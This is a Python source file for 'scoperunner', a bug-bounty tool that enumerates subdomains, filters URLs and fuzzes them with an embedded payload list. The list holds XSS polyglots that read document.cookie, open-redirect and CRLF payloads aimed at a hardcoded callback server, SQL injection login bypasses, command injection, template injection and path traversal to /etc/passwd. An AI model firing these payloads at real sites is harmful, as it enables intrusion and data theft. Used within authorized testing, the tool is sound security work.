'''
scoperunner

A tool developed to help automating some initial steps of vulnerability assessment on web hosts, integrating several tools to build a smooth experience when hunting bugs.

with <3 from j0azz
'''

import subprocess
import sys
import requests
import time

# def initialize():
#     try:
#         subprocess.check_output("rmdir -rf results fuzz")
#         subprocess.check_output("rm *.txt")
#         subprocess.check_output("mkdir results")
#         subprocess.check_output("mkdir fuzz")
#     except Exception as e:
#         print(e)

    
def discovery_mode(wildcards):
    fuzzable = [w.replace("*", "FUZZ") for w in wildcards]
    #wl_index = wordlists_index()
    wl_file = open("wordlists/endpoint-discovery", "r")
    default_wordlist=wl_file.read()
    wl_file.close()
    level = int(input("insert a number between 5 and 1000000 to represent the level of discovery.\n\n>> "))
    wordlist = (default_wordlist.split("\n")[:level])
    fuzzed = []
    for d in fuzzable:
        for w in wordlist:
            time.sleep(2)
            req = requests.get("https://"+d.replace("FUZZ", w))
            if(req.status_code is not 404):
                res = summarize_response(d, req)
                fuzzed.append(res)
                print(res[0]["status"])
    return fuzzed


def validate_vulnerability(vuln="*", ):
    pass

def summarize_response(request, response):
    writable = "## REQUEST "+"\n"+request+"\n"+"## RESPONSE:"+str(response.status_code)+"\n"+response.text+"\n--\n"
    res = [{"status":int(response.status_code), "content":response.text, "headers":response.headers}, writable]
    return res

def fuzz(payloads, target, bbp_header="", tags=""):
    scheme = "https://"
    if("http" in target):
        scheme = ""
    Target = scheme+target
    print("Target: ", Target, "\n")
    responses = []
    methods = ["GET", "POST", "PUT", "DELETE", "OPTIONS", "HEAD"]
    for p in payloads:
        res = requests.get(Target.replace("FUZZ", p), headers={"User-Agent":"Mozilla/5.0 (platform; rv:geckoversion) "+bbp_header})
        summarized_res = summarize_response(Target.replace("FUZZ", p), res)
        if("#status:200" in tags):
            if(summarized_res[0]["status"]==200):
                responses.append(summarized_res)
            else:
                continue
        else:
            responses.append(summarized_res)
    return responses

def read_payloads(aux_server="https://eop3vd9wn2wdnv1.m.pipedream.net"):# https://eop3vd9wn2wdnv1.m.pipedream.net is mine
    f = open("payloads", "r")
    content = f.read()
    Payloads = {}
    key = ""
    for l in content.split("\n"):
        if("#" in l[:1]):
            key = l[1:]
            Payloads[l[1:]]=[]
            continue
        if(l==""):
            continue
        if("<AUX_SERVER>" in l):
            Payloads[key].append(l.replace("<AUX_SERVER>", aux_server))
        else:
            Payloads[key].append(l)
    return Payloads

default_payloads = read_payloads()

def wordlists_index(base = "/usr/share/wordlists/"):
    wordlists = []
    folders = [base+"dirb", base+"wfuzz/vulns", base+"wfuzz/Injections", base+"wfuzz/general", base+"dirbuster"]
    for f in folders:
        print(subprocess.check_output(("bash list-paths.sh "+f).split()))
        f = open("lists.txt", "r")
        wordlists += (f.read()).split("\n")[:-1]
        f.close()
    print("Listed wordlists:\n\n", wordlists)
    return wordlists[1:]

keywords = ["/admin", "/api", "/login", "key=", "url=", "file=", "redirect="]#, "json=", "/upload", "/graphql", "download=", "input=", "/env", "domain=", "user=", "path=",]#"source=", "api="]
stats_by_keyword = {}
urls_by_keyword = {}
in_urls = [] 
Extracted = []
extracted = []
wildcards = []
discovered = []

# initialize()
print('''
scoperunner

A tool developed to help automating some initial steps of vulnerability assessment on web hosts, integrating several tools to build a smooth experience when hunting bugs.

with <3 from j0azz
''')
print("\n\tUsage: python scoperunner.py [resume, resume2, -nuclei]\nwhere 'scope' is a file on the same path containing a list of URLs.\nonly use resume when you already have a selected-urls.txt file.\nonly use resume2 when you already have a refined-scope.txt file.\n\n")
resume = False
resume2 = False
nuclei_enabled = "-nuclei" in sys.argv
if(len(sys.argv)<2):
    pass
elif(sys.argv[1]=="resume"):
    print("Resume enabled.\n starting from a ready to use selected-urls.txt file.\n\n ")
    resume = True
elif(sys.argv[1]=="resume2"):
    print("Resume enabled.\n starting from a ready to use refined-scope.txt file.\n\n ") 
    resume = True
    resume2 = True
if(not resume):
    try:
        
        super_scope_file = open("scope", "r")
        ssf_content = super_scope_file.read()
        if("*" in ssf_content):
            print("Discovery mode triggered by the scope (*). Setting up subdomain enumeration mode. . .\n\n")
            old_content = ssf_content.split("\n")[:-1]
            new_content = ""
            for l in old_content:
                if("*" in l):
                    wildcards.append(l)
                    continue
                else:
                    new_content += (l+"\n")
            super_scope_file.close()
            with open("scope", "w") as new_scope_file:
                if(len(wildcards)>0):
                    subdomains = discovery_mode(wildcards)
                    discovered = subdomains
                    for s in subdomains:
                        new_content += (s+"\n")
                    print("Rebuilding scope file . . .\n ")
                new_scope_file.write(new_content)
            new_scope_file.close()
        
        print("Creating dataset file . . .\n")
        print(subprocess.check_output(("bash extract_urls.sh").split()))
    except Exception as e:
        print(e)
        sys.exit(1)
if(not resume2):
    try:
        print("Filtering selected URLs. . .")
        f = open("selected-urls.txt", "r")
        content = f.read()
        in_urls = content.split("\n")[:-1]
        f.close()
    except Exception as e:
        print("An error occurred while trying to open the file selected-urls.txt\n\n", e)
        sys.exit(1)
    if(len(in_urls)==0):
        print("No URLs to work on.")
        sys.exit(1)
    else:
        print("Extracting interesting URLs from ",len(in_urls)," entities . . .")
        for k in keywords:
            stats_by_keyword[k] = 0
            urls_by_keyword[k] = []
            for u in in_urls:
                if(k in u):
                    urls_by_keyword[k].append(u)
                    stats_by_keyword[k] += 1
                    if(u not in extracted):
                        Extracted.append(u)
        extracted = Extracted
        if(len(extracted)==0):
            print("No filtering performed.\n")

        print(len(in_urls)-len(extracted), " URLs were removed from the source, proceeding to work with ", len(extracted), " URLs.")
        print("stats by keyword: \n")
        print(stats_by_keyword)

        if(input("\nEnter 'yes' if you want to remove some tag from your analysis, or just enter to proceed.\n\n>> ")=="yes"):
            print("Tags supported in this analysis:\n")
            print(stats_by_keyword)
            tags_to_remove = input("\nEnter the tags you want to remove in this format: 'tag1 tag2 tag3'\ne.g.: '/admin /api key=' will remove all the urls containing those patterns.\n\n>> ")
            ttr = tags_to_remove.split(" ")
            extracted = []
            for t in keywords:
                if(t in ttr):
                    continue
                else:
                    extracted += urls_by_keyword[t]
            extracted = list(set(extracted))
            extracted += wildcards
        try:
            print("Creating refined scope file. . .\n")
            refined = ""
            for i in extracted:
                refined += (i + "\n")
            with open("refined-scope.txt", "w") as f:
                #print(refined)
                f.write(refined)
                print("Successfully created.\n")
        except Exception as e:
            print("A problem occured while creating refined-scope.txt file.", e)
            sys.exit(1)

print("Proceeding to scan. . .\n\n")
p_set = [key for key in default_payloads.keys()]
c = input("Press: \ns\tto select payloads\np\tto reload payload set from file\nq\tto quit\n[Enter]\tto proceed with the scan.\n\n>>> ")
if(c=="s"):
    i = 1
    print("Payloads categories available:\n\n")
    for k in default_payloads.keys():
        print(i, "\t-\t", k)
        i += 1
    keys = [key for key in default_payloads.keys()]
    selection = [int(i)-1 for i in (input("Enter only the categories you want, using the corresponding keys. (x y z)\n\n>> ")).split(" ")]
    payload_set = []
    for s in selection:
        payload_set.append(keys[s])
    p_set = payload_set

elif(c=="p"):
    default_payloads = read_payloads()
elif(c=="q"):
    sys.exit(1)

if(nuclei_enabled):
    print("\nRunning nuclei on refined scope. . .\n")
    print(subprocess.check_output("nuclei -l refined-scope.txt -v -t cves/ -t exposures/ -severity critical,high -headless".split()))
print("Fuzzing selected URLs. . . \n")

w_fuzz_results_by_tag = {}
fuzz_results_by_tag = {}
writable = ""
for p in p_set:
    w_fuzz_results_by_tag[p]=""
    fuzz_results_by_tag[p]=[]
    for url in extracted:
        Fuzz=fuzz(default_payloads[p], url)
        arr_fuzz = [f[0] for f in Fuzz]
        w_fuzz = str([f[1] for f in Fuzz])
        fuzz_results_by_tag[p].append(arr_fuzz)
        w_fuzz_results_by_tag[p]+=w_fuzz
        writable += (w_fuzz+"\n\n")

print("\nWriting to file. . .\n")
with open("fuzz/fuzzresults", "w") as fuzz_results:
    fuzz_results.write(writable) 
    print("\nResults wrote to fuzz/fuzzresults.\n\n")
fuzz_results.close()

        
'''

necessary files:
    scope - containing a list of URLs
    payloads - bellow we have the default set of payloads supported by scoperunner. note its special notation to keep both readability and easy manipulation, as well as to include new samples.

#XSS
''><script>alert(document.cookie)</script><!--//
</script><script>alert(document.cookie)</script><!--//
"</script><script>alert(document.cookie)</script><!--//
    jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
“ onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http://i.imgur.com/P8mL8.jpg">
javascript://'/</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/*
javascript://</title></textarea></style></script --><li '//" '*/alert()/*', onclick=alert()//
javascript:alert()//--></script></textarea></style></title><a"//' onclick=alert()//>*/alert()/*
/</title/'/</style/</script/</textarea/--><p" onclick=alert()//>*/alert()/*
javascript://--></title></style></textarea></script><svg "//' onclick=alert()//
/</title/'/</style/</script/--><p" onclick=alert()//>*/alert()/*
JavaScript://%250Aalert?.(1)//'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\76-->
"><script>alert(document.cookie)</script><!--//

#OPEN_REDIRECT
<AUX_SERVER>
\\<AUX_SERVER>
@<AUX_SERVER>

#SQLi
444/**/OR/**/MID(CURRENT_USER,1,1)/**/LIKE/**/"p"/**/#
SLEEP(1) /*’ or SLEEP(1) or’” or SLEEP(1) or “*/
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*

#CRLFi
/%0d%0aLocation:%20<AUX_SERVER>
%0dSet-Cookie:csrf_token=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
//<AUX_SERVER>/%2f%2e%2e%0d%0aheader:header
%0d%0aContent-Type:%20text%2fhtml%0d%0aHTTP%2f1.1%20200%20OK%0d%0aContent-Type:%20text%2fhtml%0d%0a%0d%0a%3Cscript%3Ealert('XSS');%3C%2fscript%3E

#COMMAND_INJECTION
;ls
||ls;
|ls;
&&ls;
&ls;
%0Als
`ls`
$(ls)

#SSTI
${{<%[%'"}}%\
{{7*7}}
${7*7}
<%= 7*7 %>
<%=`id`%>
${{7*7}}
{{7*'7'}}
#{7*7}
{{7*'7'}}

#PATH_TRAVERSAL
/etc/passwd
../../../../../../etc/hosts
..\..\..\..\..\..\etc/hosts
../../../../../../etc/hosts
C:/windows/system32/drivers/etc/hosts
../../../../../../windows/system32/drivers/etc/hosts
..\..\..\..\..\..\windows/system32/drivers/etc/hosts


'''